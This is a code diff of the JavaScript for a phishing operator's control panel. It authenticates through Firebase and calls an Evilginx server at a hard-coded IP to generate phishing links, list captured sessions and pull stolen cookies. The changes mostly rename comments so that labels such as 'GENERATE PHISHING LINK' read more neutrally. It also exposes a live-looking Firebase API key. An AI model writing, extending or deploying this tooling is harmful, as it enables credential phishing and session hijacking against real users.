@@ -1,7 +1,6 @@
-// Ensure script.js is loaded by checking in the console
-console.log("script.js is loaded");
+console.log("Script.js loaded");
 
-// Firebase Configuration
+// ✅ Firebase Configuration
 const firebaseConfig = {
     apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
     authDomain: "panel-auth-134b7.firebaseapp.com",
@@ -11,14 +10,14 @@ const firebaseConfig = {
     appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
 };
 
-// Initialize Firebase
+// ✅ Initialize Firebase
 firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 
-// ✅ Evilginx Server URL (Modify this to match your Evilginx API location)
-const EVILGINX_SERVER = "http://3.149.242.245:5000"; 
+// ✅ Evilginx API URL
+const EVILGINX_SERVER = "http://3.149.242.245:5000";
 
-// Ensure login function is properly loaded
+// 🔹 Ensure event listeners are correctly added
 document.addEventListener("DOMContentLoaded", function () {
     document.getElementById("loginBtn")?.addEventListener("click", login);
     document.getElementById("logoutBtn")?.addEventListener("click", logout);
@@ -54,7 +53,7 @@ function logout() {
     });
 }
 
-// 🔹 GENERATE PHISHING LINK
+// 🔹 GENERATE LINK FUNCTION
 function generateLink() {
     fetch(`${EVILGINX_SERVER}/generate_link`, {
         method: "POST",
@@ -87,7 +86,7 @@ function fetchCapturedSessions() {
     .catch(error => console.error("Error fetching sessions:", error));
 }
 
-// 🔹 FETCH COOKIES FROM CAPTURED SESSIONS
+// 🔹 FETCH COOKIES FUNCTION
 function fetchCookies() {
     fetch(`${EVILGINX_SERVER}/cookies`)
     .then(response => response.json())
